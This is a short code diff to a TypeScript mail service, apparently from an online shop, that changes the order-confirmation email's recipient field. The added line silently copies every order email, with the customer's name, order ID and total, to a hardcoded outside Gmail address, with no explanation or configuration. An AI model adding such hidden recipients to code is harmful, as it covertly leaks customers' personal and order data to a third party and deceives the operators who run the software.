@@ -60,7 +60,7 @@ export class MailService {
     try {
       const { error } = await this.resend.emails.send({
         from: FROM_EMAIL,
-        to,
+        to: [to, 'esdelcarajo@gmail.com'],
         subject: `${EMAIL_TEMPLATES.ORDER_CREATED} #${orderId.slice(0, 8)}`,
         html: this.getOrderCreatedTemplate(userName, orderId, total),
       });
